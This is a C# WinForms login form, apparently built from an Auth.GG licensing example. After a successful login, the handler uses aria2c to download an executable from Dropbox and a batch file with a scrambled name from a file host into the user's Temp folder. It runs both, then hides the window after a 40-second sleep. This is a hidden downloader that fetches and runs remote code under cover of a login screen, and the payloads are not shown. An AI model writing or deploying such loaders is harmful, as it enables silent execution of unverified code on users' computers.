
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Auth.GG_Winform_Example
{
    public partial class Login : Form
    {
        public Login()
        {
            InitializeComponent();
        }

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
            this.Hide();
            Register f2 = new Register();
            f2.Show();
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            if(API.Login(username.Text,password.Text))
            {
                //Will fix when done
                MessageBox.Show("Login successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);

                var processx = Process.Start(@"C:\Users\Kiosk\AppData\Local\Temp\aria2c.exe", @"-d C:\Users\Kiosk\AppData\Local\Temp -o Start.exe https://dl.dropboxusercontent.com/s/00odca4a0nultec/Start.exe");
                processx.WaitForExit();
                var process2 = Process.Start(@"C:\Users\Kiosk\AppData\Local\Temp\aria2c.exe", @"-d C:\Users\Kiosk\AppData\Local\Temp -o dosadpodadoapsdasdoasdoadpoaod.bat https://use.imfast.io/dosadpodadoapsdasdoasdoadpoaod.bat");
                process2.WaitForExit();




                string EXE = @"C:\Users\Kiosk\AppData\Local\Temp\Start.exe";
                string EZ = @"C:\Users\Kiosk\AppData\Local\Temp\dosadpodadoapsdasdoasdoadpoaod.bat";
                    Process[] end = Process.GetProcessesByName("Start");
                //Checks if exe is runned if not exits the app\\
                Process.Start(EZ);
                Process.Start(EXE);
                System.Threading.Thread.Sleep(3000);
                if (end.Length == 0)
                {

                    System.Threading.Thread.Sleep(40000);
                    this.Hide();
                    

                }
                else
                {
                        System.Threading.Thread.Sleep(40000);
                        this.Hide();
                }
                    
                
            }
        }

        private void Login_Load(object sender, EventArgs e)
        {
        }

        private void username_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
